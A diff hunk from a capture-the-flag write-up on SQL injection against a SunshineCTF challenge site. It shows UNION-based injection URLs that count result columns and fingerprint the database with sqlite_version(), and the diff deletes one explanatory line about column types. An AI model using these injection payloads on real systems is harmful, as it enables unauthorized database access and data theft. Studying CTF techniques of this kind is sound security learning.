@@ -20,8 +20,6 @@ Now we want to know how many columns there are. To do that, we shall use a UNION
 
 > https://meteor.sunshinectf.games/product?product_id=1+UNION+select+NULL,+NULL,+NULL,+NULL
 
-More specifically the first column is a number column and the rest are string columns.
-
 Before we inject any code, we want to make sure we know which databse the SQL is running on. There are several tests for each one. Note that we are using `product_id=-1` to avoid any clashing of values.
 
 > https://meteor.sunshinectf.games/product?product_id=-1+UNION+select+NULL,+(sqlite_version()),+NULL,+NULL
